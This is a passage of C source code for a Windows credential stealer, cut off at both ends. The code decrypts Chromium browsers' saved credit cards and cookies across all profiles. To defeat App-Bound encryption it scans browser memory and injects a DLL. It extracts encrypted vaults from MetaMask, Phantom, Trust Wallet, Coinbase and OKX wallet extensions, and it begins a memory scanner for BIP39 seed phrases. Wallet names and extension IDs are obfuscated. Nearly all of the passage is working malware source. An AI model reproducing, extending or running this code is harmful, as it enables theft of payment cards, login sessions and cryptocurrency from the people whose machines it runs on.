    if (_copy_to_temp(db_path, tmp, sizeof(tmp)) != 0) return;

    size_t db_sz = 0;
    uint8_t *db_data = _read_file(tmp, &db_sz);
    DeleteFileA(tmp);
    if (!db_data) return;

    if (!_is_sqlite3(db_data, db_sz)) {
        free(db_data); return;
    }

    _sq_db_t db;
    db.data = db_data;
    db.size = db_sz;
    uint16_t pgsz = _be16(db_data + 16);
    db.page_size = (pgsz == 1) ? 65536u : (uint32_t)pgsz;
    if (db.page_size < 512 || db.page_size > 65536) { free(db_data); return; }

    _sq_find_t find = {"credit_cards", 0};
    _sq_walk(&db, 1, 0, _sq_find_cb, &find);
    if (find.rootpage == 0) { free(db_data); return; }

    _login_ctx_t lctx = {
        .mk = mk, .have_mk = have_mk,
        .v20mk = v20mk, .have_v20mk = have_v20mk,
        .out = out, .outsz = outsz, .pos = pos,
        .bname = bname, .pname = pname,
    };
    _sq_walk(&db, find.rootpage, 0, _ccard_cb, &lctx);
    free(db_data);
}

/* ── Snappy block decompressor ──────────────────────────────────────── */

static uint64_t _snp_varint(const uint8_t *b, size_t sz, size_t *p) {
    uint64_t r = 0; int s = 0;
    while (*p < sz) { uint8_t c = b[(*p)++]; r |= (uint64_t)(c & 0x7f) << s; if (!(c & 0x80)) break; s += 7; }
    return r;
}

/* Decompress one Snappy block. Returns decompressed size, or 0 on error.
   out must be pre-allocated to at least *out_sz bytes. */
static size_t _snappy_decomp(const uint8_t *in, size_t in_sz,
                              uint8_t *out, size_t out_cap)
{
    size_t ip = 0;
    uint64_t ulen = _snp_varint(in, in_sz, &ip);
    if (ulen == 0 || ulen > out_cap) return 0;

    size_t op = 0;
    while (ip < in_sz && op < ulen) {
        uint8_t tag = in[ip++];
        int type = tag & 3;

        if (type == 0) { /* literal */
            uint32_t len;
            int lbits = (tag >> 2) & 0x3f;
            if (lbits < 60) {
                len = (uint32_t)lbits + 1;
            } else {
                int nb = lbits - 59;
                if (ip + nb > in_sz) return 0;
                len = 0;
                for (int i = 0; i < nb; i++) len |= (uint32_t)in[ip++] << (8*i);
                len++;
            }
            if (ip + len > in_sz || op + len > ulen) return 0;
            memcpy(out + op, in + ip, len);
            op += len; ip += len;
        } else if (type == 1) { /* copy 1-byte offset */
            uint32_t len = ((tag >> 2) & 7) + 4;
            if (ip >= in_sz) return 0;
            uint32_t off = ((uint32_t)(tag & 0xe0) << 3) | in[ip++];
            if (off == 0 || op < off || op + len > ulen) return 0;
            const uint8_t *src = out + op - off;
            for (uint32_t i = 0; i < len; i++) out[op++] = src[i];
        } else if (type == 2) { /* copy 2-byte offset */
            uint32_t len = (tag >> 2) + 1;
            if (ip + 2 > in_sz) return 0;
            uint32_t off = (uint32_t)in[ip] | ((uint32_t)in[ip+1] << 8); ip += 2;
            if (off == 0 || op < off || op + len > ulen) return 0;
            const uint8_t *src = out + op - off;
            for (uint32_t i = 0; i < len; i++) out[op++] = src[i];
        } else { /* copy 4-byte offset */
            uint32_t len = (tag >> 2) + 1;
            if (ip + 4 > in_sz) return 0;
            uint32_t off = (uint32_t)in[ip] | ((uint32_t)in[ip+1]<<8)
                         | ((uint32_t)in[ip+2]<<16) | ((uint32_t)in[ip+3]<<24); ip += 4;
            if (off == 0 || op < off || op + len > ulen) return 0;
            const uint8_t *src = out + op - off;
            for (uint32_t i = 0; i < len; i++) out[op++] = src[i];
        }
    }
    return op;
}

/* ── LevelDB SST parser ─────────────────────────────────────────────── */

/* Chrome LDB SST magic: 0xdb4775248b80fb57 (little-endian in file) */
static const uint8_t LDB_MAGIC[8] = {0x57,0xfb,0x80,0x8b,0x24,0x75,0x47,0xdb};

static uint64_t _ldb_var(const uint8_t *b, size_t sz, size_t *p) {
    return _snp_varint(b, sz, p);
}

/* Decompress one LDB block (compression byte at b[raw_sz]).
   Returns allocated buffer + decompressed size, or NULL. Caller frees. */
static uint8_t *_ldb_block(const uint8_t *b, size_t raw_sz, uint8_t compr,
                            size_t *out_sz)
{
    if (compr == 0) { /* no compression */
        uint8_t *cp = (uint8_t *)malloc(raw_sz);
        if (!cp) return NULL;
        memcpy(cp, b, raw_sz);
        *out_sz = raw_sz;
        return cp;
    }
    if (compr != 1) return NULL; /* unknown compression */
    /* Snappy: peek uncompressed length */
    size_t pp = 0;
    uint64_t ulen = _snp_varint(b, raw_sz, &pp);
    if (ulen == 0 || ulen > 32 * 1024 * 1024) return NULL;
    uint8_t *cp = (uint8_t *)malloc((size_t)ulen + 1);
    if (!cp) return NULL;
    size_t got = _snappy_decomp(b, raw_sz, cp, (size_t)ulen);
    if (got == 0) { free(cp); return NULL; }
    cp[got] = 0;
    *out_sz = got;
    return cp;
}

/* Walk entries in an uncompressed data block.
   For each entry: call cb(key, klen, val, vlen, ud). Stops if cb returns 1. */
typedef int (*_ldb_cb_t)(const uint8_t *k, size_t kl,
                          const uint8_t *v, size_t vl, void *ud);

static void _ldb_walk_block(const uint8_t *blk, size_t bsz, _ldb_cb_t cb, void *ud)
{
    if (bsz < 4) return;
    uint32_t nr = (uint32_t)blk[bsz-4] | ((uint32_t)blk[bsz-3]<<8)
                | ((uint32_t)blk[bsz-2]<<16) | ((uint32_t)blk[bsz-1]<<24);
    if (nr > 1000000) return;
    size_t dend = bsz - 4 - (size_t)nr * 4;
    if (dend > bsz) return;

    uint8_t prev[512]; size_t prev_len = 0;
    for (size_t p = 0; p < dend; ) {
        uint64_t sh = _ldb_var(blk, dend, &p);
        uint64_t ns = _ldb_var(blk, dend, &p);
        uint64_t vl = _ldb_var(blk, dend, &p);
        if (sh > prev_len || ns > dend || vl > dend || p + ns + vl > dend) break;
        uint8_t cur[512]; size_t cl = (size_t)(sh + ns);
        if (cl <= sizeof(cur)) {
            memcpy(cur, prev, (size_t)sh);
            memcpy(cur + sh, blk + p, (size_t)ns);
        }
        p += (size_t)ns;
        if (cb(cl <= sizeof(cur) ? cur : NULL, cl, blk + p, (size_t)vl, ud))
            return;
        p += (size_t)vl;
        if (cl <= sizeof(cur)) { memcpy(prev, cur, cl); prev_len = cl; }
    }
}

/* Callback state + named callback for _ldb_sst_find */
typedef struct { const char **markers; char *result; } _srch_t;

static int _marker_cb(const uint8_t *k, size_t kl,
                      const uint8_t *v, size_t vl, void *ud)
{
    (void)k; (void)kl;
    _srch_t *s = (_srch_t *)ud;
    for (int mi = 0; s->markers[mi]; mi++) {
        size_t mlen = strlen(s->markers[mi]);
        for (size_t i = 0; i + mlen <= vl; i++) {
            if (memcmp(v+i, s->markers[mi], mlen) == 0) {
                s->result = (char *)malloc(vl + 1);
                if (s->result) { memcpy(s->result, v, vl); s->result[vl] = 0; }
                return 1;
            }
        }
    }
    return 0;
}

/* Scan entire SST file for values containing any marker.
   Returns allocated clean JSON string (caller frees) or NULL. */
static char *_ldb_sst_find(const uint8_t *data, size_t data_len,
                             const char **markers)
{
    if (data_len < 48 || memcmp(data + data_len - 8, LDB_MAGIC, 8) != 0)
        return NULL;

    const uint8_t *foot = data + data_len - 48;
    size_t fp = 0;
    uint64_t mi_off, mi_sz, idx_off, idx_sz;
    mi_off = _ldb_var(foot, 48, &fp);
    mi_sz  = _ldb_var(foot, 48, &fp);
    idx_off = _ldb_var(foot, 48, &fp);
    idx_sz  = _ldb_var(foot, 48, &fp);
    (void)mi_off; (void)mi_sz;

    if (idx_off + idx_sz + 5 > data_len) return NULL;

    /* Decompress index block */
    size_t idx_dsz = 0;
    uint8_t *idx_blk = _ldb_block(data + idx_off, (size_t)idx_sz,
                                    data[idx_off + idx_sz], &idx_dsz);
    if (!idx_blk) return NULL;

    /* Walk index entries to enumerate data blocks */
    char *result = NULL;
    uint8_t iprev[512]; size_t iprev_len = 0;
    uint32_t inr = (idx_dsz >= 4) ?
        ((uint32_t)idx_blk[idx_dsz-4] | ((uint32_t)idx_blk[idx_dsz-3]<<8)
        |((uint32_t)idx_blk[idx_dsz-2]<<16)|((uint32_t)idx_blk[idx_dsz-1]<<24)) : 0;
    size_t iend = (idx_dsz >= 4 + (size_t)inr*4) ? idx_dsz - 4 - (size_t)inr*4 : 0;

    for (size_t ip = 0; ip < iend && !result; ) {
        uint64_t sh = _ldb_var(idx_blk, iend, &ip);
        uint64_t ns = _ldb_var(idx_blk, iend, &ip);
        uint64_t vl = _ldb_var(idx_blk, iend, &ip);
        if (sh > iprev_len || ns > iend || vl > iend || ip + ns + vl > iend) break;
        uint8_t ik[512]; size_t ikl = (size_t)(sh + ns);
        if (ikl <= sizeof(ik)) { memcpy(ik, iprev, (size_t)sh); memcpy(ik+sh, idx_blk+ip, (size_t)ns); }
        ip += (size_t)ns;

        /* Decode block handle */
        size_t vp = ip;
        uint64_t blk_off = _ldb_var(idx_blk, ip+(size_t)vl, &vp);
        uint64_t blk_sz  = _ldb_var(idx_blk, ip+(size_t)vl, &vp);
        ip += (size_t)vl;

        if (blk_off + blk_sz + 5 > data_len || blk_sz == 0) {
            if (ikl <= sizeof(ik)) { memcpy(iprev, ik, ikl); iprev_len = ikl; }
            continue;
        }

        /* Decompress data block */
        size_t dsz = 0;
        uint8_t *dblk = _ldb_block(data + (size_t)blk_off, (size_t)blk_sz,
                                     data[(size_t)blk_off + (size_t)blk_sz], &dsz);
        if (!dblk) { if (ikl<=sizeof(ik)){memcpy(iprev,ik,ikl);iprev_len=ikl;} continue; }

        /* Quick check: does this block contain any marker? */
        int has_marker = 0;
        for (int mi = 0; markers[mi] && !has_marker; mi++) {
            size_t mlen = strlen(markers[mi]);
            for (size_t si = 0; si + mlen <= dsz; si++) {
                if (memcmp(dblk + si, markers[mi], mlen) == 0) { has_marker = 1; break; }
            }
        }

        if (has_marker) {
            _srch_t sr = { markers, NULL };
            _ldb_walk_block(dblk, dsz, _marker_cb, &sr);
            result = sr.result;
        }

        free(dblk);
        if (ikl <= sizeof(ik)) { memcpy(iprev, ik, ikl); iprev_len = ikl; }
    }

    free(idx_blk);
    return result;
}

/* ── crypto wallet extension scanner ────────────────────────────────── */

static const struct {
    const unsigned char *name_e;
    size_t               name_n;
    const unsigned char *id_e;
} BEXT_TABLE[] = {
    {EVS_str_wlt_TrustWallet, sizeof(EVS_str_wlt_TrustWallet), EVS_ext_id_TrustWallet},
    {EVS_str_wlt_MetaMask,    sizeof(EVS_str_wlt_MetaMask),    EVS_ext_id_MetaMask},
    {EVS_str_wlt_Phantom,     sizeof(EVS_str_wlt_Phantom),     EVS_ext_id_Phantom},
    {EVS_str_wlt_Coinbase,    sizeof(EVS_str_wlt_Coinbase),    EVS_ext_id_CoinbaseWallet},
    {EVS_str_wlt_OKXWallet,   sizeof(EVS_str_wlt_OKXWallet),  EVS_ext_id_OKXWallet},
    {NULL, 0, NULL}
};

/* Scan one LevelDB directory for wallet vault JSON blobs */
static int _scan_ext_ldb(const char *dir, const char *ext_name,
                          const char *browser, const char *profile,
                          char *out, size_t outsz, size_t *pos)
{
    static const char *MARKERS[] = {
        "\"cipher\":\"aes-256-cbc",   /* MetaMask — trailing " may be binary in LDB */
        "\"cipher\":\"aes-128-ctr",   /* Trust Wallet / Ethereum keystore V3 */
        "\"ciphertext\":",
        "\"mnemonic\":",
        NULL
    };

    char pat[MAX_PATH];
    snprintf(pat, sizeof(pat), "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    memset(&fd, 0, sizeof(fd));
    HANDLE hf = FindFirstFileA(pat, &fd);
    if (hf == INVALID_HANDLE_VALUE) return 0;

    int total = 0;
    do {
        const char *dot = strrchr(fd.cFileName, '.');
        if (!dot) continue;
        if (_stricmp(dot, ".log") != 0 && _stricmp(dot, ".ldb") != 0) continue;

        char fpath[MAX_PATH];
        snprintf(fpath, sizeof(fpath), "%s\\%s", dir, fd.cFileName);

        HANDLE hfile = CreateFileA(fpath, GENERIC_READ,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
                                   NULL, OPEN_EXISTING, 0, NULL);
        if (hfile == INVALID_HANDLE_VALUE) continue;

        LARGE_INTEGER li = {0};
        GetFileSizeEx(hfile, &li);
        if (li.QuadPart == 0 || li.QuadPart > 4 * 1024 * 1024) {
            CloseHandle(hfile);
            continue;
        }
        uint8_t *buf = (uint8_t *)malloc((size_t)li.QuadPart + 1);
        if (!buf) { CloseHandle(hfile); continue; }
        DWORD rd = 0;
        ReadFile(hfile, buf, (DWORD)li.QuadPart, &rd, NULL);
        CloseHandle(hfile);
        buf[rd] = 0;

        int found_in_file = 0;
        if (_stricmp(dot, ".ldb") == 0) {
            /* SST file: Snappy-aware parser extracts clean decompressed value */
            char *json = _ldb_sst_find(buf, (size_t)rd, MARKERS);
            if (json) {
                size_t avail = outsz - *pos - 1;
                int n = snprintf(out + *pos, avail,
                    "[ WALLET : %s / %s / %s ]\n%s\n\n",
                    browser, profile, ext_name, json);
                if (n > 0) *pos += (n < (int)avail) ? (size_t)n : avail;
                total++;
                found_in_file = 1;
                free(json);
            }
        } else {
            /* .log files: plain text, bracket-matching is sufficient */
            for (int m = 0; MARKERS[m] && !found_in_file; m++) {
                size_t mlen = strlen(MARKERS[m]);
                for (size_t i = 0; i + mlen <= rd && !found_in_file; i++) {
                    if (memcmp(buf + i, MARKERS[m], mlen) != 0) continue;

                    size_t js = i;
                    while (js > 0 && buf[js] != '{' && buf[js] != '[') js--;
                    if (buf[js] != '{' && buf[js] != '[') continue;
                    char open = (char)buf[js];
                    char close = (open == '[') ? ']' : '}';

                    size_t je = js;
                    int depth = 0;
                    while (je < rd) {
                        if ((char)buf[je] == open) depth++;
                        else if ((char)buf[je] == close) { if (--depth == 0) { je++; break; } }
                        je++;
                    }
                    if (depth != 0) continue;

                    size_t jlen = je - js;
                    if (jlen < 10 || jlen > 16384) continue;

                    char san[65536];
                    size_t wpos = 0;
                    for (size_t k = 0; k < jlen && wpos + 5 < sizeof(san) - 1; k++) {
                        uint8_t b = buf[js + k];
                        if (b >= 0x20 && b < 0x7f) {
                            san[wpos++] = (char)b;
                        } else {
                            san[wpos++] = '\\';
                            san[wpos++] = 'x';
                            san[wpos++] = "0123456789abcdef"[b >> 4];
                            san[wpos++] = "0123456789abcdef"[b & 0xf];
                        }
                    }
                    san[wpos] = 0;

                    size_t avail = outsz - *pos - 1;
                    int n = snprintf(out + *pos, avail,
                        "[ WALLET : %s / %s / %s ]\n%s\n\n",
                        browser, profile, ext_name, san);
                    if (n > 0) *pos += (n < (int)avail) ? (size_t)n : avail;
                    total++;
                    found_in_file = 1;
                }
            }
        }
        free(buf);
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
    return total;
}

/* Scan all known crypto extensions for a profile */
static void _dump_wallets(const char *browser, const char *profile,
                           const char *ud, int use_profiles,
                           char *out, size_t outsz, size_t *pos)
{
    char base[MAX_PATH];
    if (use_profiles)
        snprintf(base, sizeof(base), "%s\\%s\\Local Extension Settings", ud, profile);
    else
        snprintf(base, sizeof(base), "%s\\Default\\Local Extension Settings", ud);

    if (GetFileAttributesA(base) == INVALID_FILE_ATTRIBUTES) return;

    for (int i = 0; BEXT_TABLE[i].name_e; i++) {
        char ext_name[20] = {0}, ext_id[36] = {0};
        _evs_dec(ext_name, BEXT_TABLE[i].name_e, BEXT_TABLE[i].name_n);
        _evs_dec(ext_id,   BEXT_TABLE[i].id_e,   32);
        char extdir[MAX_PATH];
        snprintf(extdir, sizeof(extdir), "%s\\%s", base, ext_id);
        SecureZeroMemory(ext_id, sizeof(ext_id));
        if (GetFileAttributesA(extdir) == INVALID_FILE_ATTRIBUTES) {
            SecureZeroMemory(ext_name, sizeof(ext_name));
            continue;
        }
        _scan_ext_ldb(extdir, ext_name, browser, profile, out, outsz, pos);
        SecureZeroMemory(ext_name, sizeof(ext_name));
    }
}

/* ── cookie dump ─────────────────────────────────────────────────────── */

typedef struct {
    const uint8_t *mk;
    int            have_mk;
    const uint8_t *v20mk;
    int            have_v20mk;
    char          *out;
    size_t         outsz;
    size_t        *pos;
    const char    *bname;
    const char    *pname;
} _cookie_ctx_t;

static int _is_enc_blob(const uint8_t *b, uint32_t l)
{
    if (l >= 3 && (memcmp(b,"v10",3)==0 || memcmp(b,"v11",3)==0 || memcmp(b,"v20",3)==0))
        return 1;
    /* DPAPI blob header */
    if (l >= 6 && b[0]==0x01 && b[1]==0x00 && b[2]==0x00 && b[3]==0x00 &&
        b[4]==0xd0 && b[5]==0x8c)
        return 1;
    return 0;
}

static void _cookie_cb(void *ctx_, const _sq_row_t *row)
{
    _cookie_ctx_t *ctx = (_cookie_ctx_t *)ctx_;
    if (*ctx->pos + 512 >= ctx->outsz)
        return;

    /*
     * Cookie table schema by Chrome version:
     * New (Chrome 108+): creation|host|top_frame|name|value|enc_value|path|...  (n>=6)
     * Old (< Chrome 108): creation|host|name|value|enc_value|path|...           (n>=5)
     * Detect by checking which column holds the encrypted blob.
     */
    int host_col, name_col, val_col, enc_col, path_col;
    if (row->n >= 6 &&
        (row->len[5] == 0 || _is_enc_blob(row->val[5], row->len[5]))) {
        host_col = 1; name_col = 3; val_col = 4; enc_col = 5; path_col = 6;
    } else if (row->n >= 5 &&
               (row->len[4] == 0 || _is_enc_blob(row->val[4], row->len[4]))) {
        host_col = 1; name_col = 2; val_col = 3; enc_col = 4; path_col = 5;
    } else return;

    /* host_key must be non-empty TEXT */
    if (!(row->type[host_col] >= 13 && (row->type[host_col] & 1))) return;
    if (row->len[host_col] == 0) return;

    char host[256] = {0};
    size_t hl = row->len[host_col] < sizeof(host)-1 ? row->len[host_col] : sizeof(host)-1;
    memcpy(host, row->val[host_col], hl);

    char cname[256] = {0};
    if (row->n > name_col && row->type[name_col] >= 13 && (row->type[name_col] & 1))
    {
        size_t nl = row->len[name_col] < sizeof(cname)-1 ? row->len[name_col] : sizeof(cname)-1;
        memcpy(cname, row->val[name_col], nl);
    }

    char path[128] = "/";
    if (row->n > path_col && row->type[path_col] >= 13 && (row->type[path_col] & 1) &&
        row->len[path_col] > 0)
    {
        size_t pl = row->len[path_col] < sizeof(path)-1 ? row->len[path_col] : sizeof(path)-1;
        memcpy(path, row->val[path_col], pl);
        path[pl] = 0;
    }

    char value[4096] = {0};
    int got_val = 0;
    if (row->n > enc_col && row->len[enc_col] > 0) {
        got_val = (_decrypt_pw(ctx->mk, ctx->have_mk,
                               ctx->v20mk, ctx->have_v20mk,
                               row->val[enc_col], row->len[enc_col],
                               value, sizeof(value), 1) == 0);
    }
    if (!got_val && row->n > val_col &&
        row->type[val_col] >= 13 && (row->type[val_col] & 1) && row->len[val_col] > 0)
    {
        size_t vl = row->len[val_col] < sizeof(value)-1 ? row->len[val_col] : sizeof(value)-1;
        memcpy(value, row->val[val_col], vl);
    }

    size_t avail = ctx->outsz - *ctx->pos - 1;
    int n = snprintf(ctx->out + *ctx->pos, avail,
                     "[ %s / %s ] %s\n"
                     "  NAME  : %s\n"
                     "  PATH  : %s\n"
                     "  VALUE : %s\n\n",
                     ctx->bname, ctx->pname, host, cname, path, value);
    if (n > 0) *ctx->pos += (size_t)n < avail ? (size_t)n : avail;

    SecureZeroMemory(value, sizeof(value));
}

static void _dump_cookies_profile(const char *bname, const char *pname,
                                   const uint8_t *mk, int have_mk,
                                   const uint8_t *v20mk, int have_v20mk,
                                   const char *db_path,
                                   const char *proc_name,
                                   char *out, size_t outsz, size_t *pos)
{
    char tmp[MAX_PATH] = {0};
    int rc = _copy_to_temp(db_path, tmp, sizeof(tmp));
    if (rc != 0 && proc_name)
        rc = _copy_via_dup(db_path, tmp, sizeof(tmp), proc_name);
    if (rc != 0)
        return;

    size_t db_sz = 0;
    uint8_t *db_data = _read_file(tmp, &db_sz);
    DeleteFileA(tmp);
    if (!db_data) return;

    _apply_wal(&db_data, &db_sz, db_path);

    if (!_is_sqlite3(db_data, db_sz)) {
        free(db_data); return;
    }

    _sq_db_t db;
    db.data = db_data;
    db.size = db_sz;
    uint16_t pgsz = _be16(db_data + 16);
    db.page_size = (pgsz == 1) ? 65536u : (uint32_t)pgsz;
    if (db.page_size < 512 || db.page_size > 65536) { free(db_data); return; }

    _sq_find_t find = {"cookies", 0};
    _sq_walk(&db, 1, 0, _sq_find_cb, &find);
    if (!find.rootpage) { free(db_data); return; }

    _cookie_ctx_t cctx = {
        .mk = mk,      .have_mk = have_mk,
        .v20mk = v20mk, .have_v20mk = have_v20mk,
        .out = out, .outsz = outsz, .pos = pos,
        .bname = bname, .pname = pname,
    };
    _sq_walk(&db, find.rootpage, 0, _cookie_cb, &cctx);
    free(db_data);
}

/* Try Network\Cookies first (Chrome 96+), fall back to Cookies */
static int _find_cookies_db(const char *ud, const char *profile,
                              char *out, size_t outsz)
{
    snprintf(out, outsz, "%s\\%s\\Network\\Cookies", ud, profile);
    if (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES) return 0;
    snprintf(out, outsz, "%s\\%s\\Cookies", ud, profile);
    if (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES) return 0;
    return -1;
}

/* ── browser enumeration ─────────────────────────────────────────────── */

/* use_profiles=1: Login Data in <ud>\Default\ and <ud>\Profile N\
   use_profiles=0: Login Data directly in <ud> (Opera) */
#define BROWSER_CREDS   1
#define BROWSER_COOKIES 2
#define BROWSER_CC      4

static void _dump_browser(const char *name,
                          const char *ud_tmpl, int use_profiles,
                          const char *proc_name,
                          int dump_flags,
                          char *out, size_t outsz, size_t *pos)
{
    char ud[MAX_PATH] = {0};
    ExpandEnvironmentStringsA(ud_tmpl, ud, sizeof(ud));

    if (GetFileAttributesA(ud) == INVALID_FILE_ATTRIBUTES)
        return;

    uint8_t mk[32] = {0};
    int have_mk = (_get_master_key(ud, mk) == 0);
    uint8_t v20mk[32] = {0};
    int have_v20mk = (_get_v20_master_key(ud, v20mk) == 0);
    char v20_dbg[512] = {0};   /* injection debug trace */

    /*
     * v20 fallback path (Chromium 127+ App-Bound Encryption):
     *  1. External memory scan — works on Chromium 127-129 (key in plaintext).
     *  2. DLL injection into browser process — works on Chromium 130+
     *     (BCryptProtectMemory'd key, requires running as same user as browser
     *     and HAVE_CHROME_INJECT built; no ACG/CIG on browser proc).
     * Both require a running browser process to hold the decrypted key.
     */
    if (!have_v20mk) {
        char hint_db[MAX_PATH] = {0};
        if (use_profiles)
            snprintf(hint_db, sizeof(hint_db), "%s\\Default\\Login Data", ud);
        else
            snprintf(hint_db, sizeof(hint_db), "%s\\Login Data", ud);

        if (GetFileAttributesA(hint_db) != INVALID_FILE_ATTRIBUTES) {
            _v20_hint_t hint;
            memset(&hint, 0, sizeof(hint));
            if (_extract_v20_hint(hint_db, &hint) == 0) {
                DWORD bpid = _find_browser_pid(proc_name);
                if (bpid) {
                    /* Step 1: memory scan — main process only (Chrome 127-129) */
                    have_v20mk = (_scan_chrome_pid(&hint, bpid, v20mk) == 0);
                    if (have_v20mk)
                        snprintf(v20_dbg, sizeof(v20_dbg), "memscan=OK");

#ifdef HAVE_CHROME_INJECT
                    /* Step 2: injection (Chrome 130+, BCrypt-protected key) */
                    if (!have_v20mk)
                        have_v20mk = (_inject_v20_chrome(bpid, &hint, v20mk,
                                                         v20_dbg, sizeof(v20_dbg)) == 0);
#endif
                } else {
                    snprintf(v20_dbg, sizeof(v20_dbg), "no_proc");
                }
            } else {
                snprintf(v20_dbg, sizeof(v20_dbg), "no_hint");
            }
        } else {
            snprintf(v20_dbg, sizeof(v20_dbg), "no_logindb");
        }
    } else {
        snprintf(v20_dbg, sizeof(v20_dbg), "dpapi_ok");
    }

    /* write v20 status header into output */
    {
        int n = snprintf(out + *pos, outsz - *pos,
                         "[%s v20: %s]\n", name,
                         have_v20mk ? v20_dbg : (v20_dbg[0] ? v20_dbg : "key=FAIL"));
        if (n > 0 && (size_t)n < outsz - *pos) *pos += n;
    }

    if (!use_profiles)
    {
        /* direct: Login Data is in ud itself (Opera, OperaGX) */
        if (dump_flags & BROWSER_CREDS) {
            char db[MAX_PATH];
            snprintf(db, sizeof(db), "%s\\Login Data", ud);
            if (GetFileAttributesA(db) != INVALID_FILE_ATTRIBUTES)
                _dump_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
                              db, out, outsz, pos);
            _dump_wallets(name, "Default", ud, 0, out, outsz, pos);
        }
        if (dump_flags & (BROWSER_CREDS | BROWSER_CC)) {
            char wdb[MAX_PATH];
            snprintf(wdb, sizeof(wdb), "%s\\Web Data", ud);
            if (GetFileAttributesA(wdb) != INVALID_FILE_ATTRIBUTES)
                _dump_cc_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
                                 wdb, out, outsz, pos);
        }
        if (dump_flags & BROWSER_COOKIES) {
            char cdb[MAX_PATH];
            if (_find_cookies_db(ud, "Default", cdb, sizeof(cdb)) == 0)
                _dump_cookies_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
                                      cdb, proc_name, out, outsz, pos);
        }
        SecureZeroMemory(mk, sizeof(mk));
        SecureZeroMemory(v20mk, sizeof(v20mk));
        return;
    }

    /* Default profile */
    {
        if (dump_flags & BROWSER_CREDS) {
            char db[MAX_PATH];
            snprintf(db, sizeof(db), "%s\\Default\\Login Data", ud);
            if (GetFileAttributesA(db) != INVALID_FILE_ATTRIBUTES)
                _dump_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
                              db, out, outsz, pos);
            _dump_wallets(name, "Default", ud, 1, out, outsz, pos);
        }
        if (dump_flags & (BROWSER_CREDS | BROWSER_CC)) {
            char wdb[MAX_PATH];
            snprintf(wdb, sizeof(wdb), "%s\\Default\\Web Data", ud);
            if (GetFileAttributesA(wdb) != INVALID_FILE_ATTRIBUTES)
                _dump_cc_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
                                 wdb, out, outsz, pos);
        }
        if (dump_flags & BROWSER_COOKIES) {
            char cdb[MAX_PATH];
            if (_find_cookies_db(ud, "Default", cdb, sizeof(cdb)) == 0)
                _dump_cookies_profile(name, "Default", mk, have_mk, v20mk, have_v20mk,
                                      cdb, proc_name, out, outsz, pos);
        }
    }

    /* Profile N directories */
    char pat[MAX_PATH];
    snprintf(pat, sizeof(pat), "%s\\Profile *", ud);
    WIN32_FIND_DATAA fd;
    memset(&fd, 0, sizeof(fd));
    HANDLE hf = FindFirstFileA(pat, &fd);
    if (hf != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                continue;
            if (dump_flags & BROWSER_CREDS) {
                char db[MAX_PATH];
                snprintf(db, sizeof(db), "%s\\%s\\Login Data", ud, fd.cFileName);
                if (GetFileAttributesA(db) != INVALID_FILE_ATTRIBUTES)
                    _dump_profile(name, fd.cFileName,
                                  mk, have_mk, v20mk, have_v20mk,
                                  db, out, outsz, pos);
                _dump_wallets(name, fd.cFileName, ud, 1, out, outsz, pos);
            }
            if (dump_flags & (BROWSER_CREDS | BROWSER_CC)) {
                char wdb[MAX_PATH];
                snprintf(wdb, sizeof(wdb), "%s\\%s\\Web Data", ud, fd.cFileName);
                if (GetFileAttributesA(wdb) != INVALID_FILE_ATTRIBUTES)
                    _dump_cc_profile(name, fd.cFileName,
                                     mk, have_mk, v20mk, have_v20mk,
                                     wdb, out, outsz, pos);
            }
            if (dump_flags & BROWSER_COOKIES) {
                char cdb[MAX_PATH];
                if (_find_cookies_db(ud, fd.cFileName, cdb, sizeof(cdb)) == 0)
                    _dump_cookies_profile(name, fd.cFileName, mk, have_mk, v20mk, have_v20mk,
                                          cdb, proc_name, out, outsz, pos);
            }
        } while (FindNextFileA(hf, &fd));
        FindClose(hf);
    }

    SecureZeroMemory(mk, sizeof(mk));
    SecureZeroMemory(v20mk, sizeof(v20mk));
}

/* ── BIP39 mnemonic memory scanner ──────────────────────────────────── */

static int _is_bip_char(uint8_t c) { return c >= 'a' && c <= 'z'; }

/* Binary search in sorted BIP39 wordlist — returns 1 if word is in BIP39 */
static int _in_bip39(const uint8_t *w, size_t wl)
{
    if (wl < 3 || wl > 8) return 0;
    char tmp[9]; memcpy(tmp, w, wl); tmp[wl] = 0;
    int lo = 0, hi = 2047;
    while (lo <= hi) {
        int mid = (lo + hi) / 2;
        int c = strcmp(tmp, _BIP39[mid]);
        if (c == 0) return 1;
        if (c < 0) hi = mid - 1; else lo = mid + 1;
    }
    return 0;
}

/* Try to match 12-24 lowercase BIP39-like words (3-8 chars) separated by spaces.
   Rejects sequences containing known non-BIP39 function words.
   Requires average word length >= 4 (BIP39 words are mostly 4-8 chars).
   Returns matched length or 0. */
static size_t _match_mnemonic(const uint8_t *b, size_t p, size_t sz)
{
    int words = 0;
    size_t start = p;
    size_t total_chars = 0;
    int short3 = 0;
    /* store word start+len for dedup check (max 24 words) */
    size_t wstarts[24]; size_t wlens[24];
    while (p < sz && words < 24) {
        size_t ws = p;
        while (p < sz && _is_bip_char(b[p])) p++;
        size_t wl = p - ws;
        if (wl < 3 || wl > 8) break;
        if (!_in_bip39(b + ws, wl)) return 0;
        /* Reject if this word is a duplicate of a previous one */
        for (int j = 0; j < words; j++) {
            if (wlens[j] == wl && memcmp(b + wstarts[j], b + ws, wl) == 0)
                return 0;
        }
        wstarts[words] = ws; wlens[words] = wl;
        total_chars += wl;
        if (wl == 3) short3++;
        words++;
        if (words == 24) break;
        if (p >= sz || b[p] != ' ') break;
        p++;
    }
    if (words < 12) return 0;
    if (total_chars / (size_t)words < 4) return 0;
    if (short3 > words / 2) return 0;
    return p - start;
}

/* Try to match BIP39 mnemonic in UTF-16 LE encoded region.
   Returns matched length in bytes (2*chars) or 0. */
static size_t _match_mnemonic_utf16(const uint8_t *b, size_t p, size_t sz)
{
    int words = 0;
    size_t start = p;
    size_t total_chars = 0;
    size_t wstarts[24]; size_t wlens[24];
    while (p + 1 < sz && words < 24) {
        size_t ws = p;
        while (p + 1 < sz && b[p+1] == 0 && _is_bip_char(b[p])) p += 2;
        size_t wl = (p - ws) / 2;
